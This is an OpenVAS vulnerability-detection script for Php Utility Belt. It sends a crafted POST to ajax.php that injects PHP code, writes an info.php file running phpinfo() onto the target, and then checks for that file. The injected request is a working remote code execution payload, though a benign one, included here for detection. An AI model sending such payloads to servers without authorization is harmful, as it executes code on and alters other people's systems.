###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_php_utility_belt_mult_vuln.nasl 11523 2018-09-21 13:37:35Z asteins $
#
# Php Utility Belt Multiple Vulnerabilities
#
# Kashinath T <tkashinath@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:php_utility_belt:php";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807614");
  script_version("$Revision: 11523 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-09-21 15:37:35 +0200 (Fri, 21 Sep 2018) $");
  script_tag(name:"creation_date", value:"2016-03-16 10:38:20 +0530 (Wed, 16 Mar 2016)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("Php Utility Belt Multiple Vulnerabilities");

  script_tag(name:"summary", value:"The host is installed with Php utilty belt
  and is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET
  request and check whether it is able to read php information.");

  script_tag(name:"insight", value:"Multiple flaws are due to an insufficient
  validation of input in text field.");

  script_tag(name:"impact", value:"Successful exploitation will allow an
  unauthenticated remote attacker to conduct remote code execution, also
  allows them to gain system information.");

  script_tag(name:"affected", value:"Php Utility Belt");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/38901");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/39554");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_php_utility_belt_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("PhpUtilityBelt/Installed");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!php_port = get_app_port(cpe:CPE)) exit(0);
if(!dir = get_app_location(cpe:CPE, port:php_port)) exit(0);

host = http_host_name(port:php_port);

postData = "code=fwrite(fopen('info.php'%2C'w')%2C'%3C%3Fphp+echo+phpinfo()%3B%3F%3E')%3B";

req =   'POST '+dir+'/ajax.php HTTP/1.1\r\n' +
	'Host: '+host+'\r\n' +
 	'Content-Length: 77\r\n'+
 	'Content-Type: application/x-www-form-urlencoded\r\n' +
	'\r\n'+
        postData;

res = http_keepalive_send_recv(port:php_port, data:req);

if(res && 'HTTP/1.1 200 OK' >< res)
{
   url = dir+ '/info.php';

   if(http_vuln_check(port:php_port, url:url,  pattern:">phpinfo\(\)<",
                      extra_check:make_list(">System", ">Configuration File")))
   {
     report = report_vuln_url( port:php_port, url:url );
     security_message(port:php_port, data:report);
     exit(0);
   }
}
